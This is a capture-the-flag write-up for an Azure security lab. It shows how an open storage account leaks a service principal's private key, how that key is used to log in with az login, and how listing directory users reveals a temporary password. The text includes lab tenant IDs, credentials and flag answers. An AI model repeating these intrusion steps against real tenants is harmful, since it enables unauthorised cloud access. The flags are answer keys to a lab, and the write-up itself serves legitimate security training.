###Challenge 1
Browse to [brokenazure.cloud](brokenazure.cloud) in burp, and you'll notice there's several html files that get loaded. If you click on the header.html request, you'll see that the banner image is hosted on an azure storage account.
![](images/1.png)

As this is the first challenge, there's a good chance this storage account is unprotected. Lets connect to https://supercompanystorage.blob.core.windows.net/storagecontainer with Azure Storage Explorer:
![](images/2.png)

The name of the .PEM file seems to be the flag: SECURA{C3RT1F1C3T3}
The storage account seems to have an employee VPN configuration as well, so its likely the config and .PEM can be used for the next challenge.

###Challenge 2
https://www.brokenazure.cloud/am1b3176321b173g183721ba73/index.html

If we crack open the .PEM file in a text editor, we can see that it contains a tenant and app id:
```
-----BEGIN AZURE_DETAILS-----
Tenant id: 4452edfd-a89d-43aa-8b46-a314c219cc50
App-id: b2bfb506-aead-40d8-9e93-6f3e5d752826
-----END AZURE_DETAILS-----
```

We can collect some more information about the tenant:
https://login.microsoftonline.com/4452edfd-a89d-43aa-8b46-a314c219cc50/.well-known/openid-configuration


The .PEM also contains the private key for the tenant. The following command returns nothing so there's no password on the file:
`openssl rsa -in <.pem> -noout`


So we have the tenant ID and we have the PEM, so lets try and authenticate with the service principal:
`az login --service-priincipal -u --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 -p "SECURA{C3RT1F1C3T3}.pem"`


Use the app id as the service principal user, and we'll get a permission error for the user:
```
> az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 -p "SECURA{C3RT1F1C3T3}.pem" --verbose
No subscriptions found for b2bfb506-aead-40d8-9e93-6f3e5d752826.
```

Hmmm, okay. After some googling, this error means that the user (appid) has no permissions or IAM allocated. After looking through `az login --help`, we see the `--allow-no-subscriptions` option:

```> az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 -p "SECURA{C3RT1F1C3T3}.pem" --allow-no-subscriptions
[
  {
    "cloudName": "AzureCloud",
    "id": "4452edfd-a89d-43aa-8b46-a314c219cc50",
    "isDefault": true,
    "name": "N/A(tenant level account)",
    "state": "Enabled",
    "tenantId": "4452edfd-a89d-43aa-8b46-a314c219cc50",
    "user": {
      "name": "b2bfb506-aead-40d8-9e93-6f3e5d752826",
      "type": "servicePrincipal"
    }
  }
]
```
So now we know the account has some level of access. However, not being an azure expert, I had no idea what could possibly be relevant to look for after running `az ad sp list`, so I had to use the hint which was: `az ad user list`:
```
> az ad user list
[
  {
    "businessPhones": [],
    "displayName": "DevOps",
    "givenName": null,
    "id": "fd871932-d592-4791-989b-53dd81f8c9e5",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "Password temp changed to SECURA{D4F4ULT_P4SSW0RD}",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "devops@secvulnapp.onmicrosoft.com"
  },
  ...
```

So our flag is SECURA{D4F4ULT_P4SSW0RD}.

###Challenge 3
https://www.brokenazure.cloud/b87312j321h321312hdsajhdjd/index.html

###Challenge 4
###Challenge 5
###Challenge 6

**Links:**
https://securitycafe.ro/2022/04/29/pentesting-azure-recon-techniques/